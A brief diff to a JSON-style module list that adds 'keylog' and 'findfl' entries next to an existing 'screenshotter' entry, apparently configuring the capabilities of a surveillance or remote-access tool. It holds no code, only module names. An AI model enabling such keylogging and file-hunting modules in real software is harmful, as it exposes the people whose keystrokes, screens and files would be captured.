@@ -2,8 +2,13 @@
    
 	
 	{
-
 	"module":"screenshotter"
+	},
+	{
+	"module":"keylog"
+	},
+	{
+	"module":"findfl"
 	}
 	
 ]
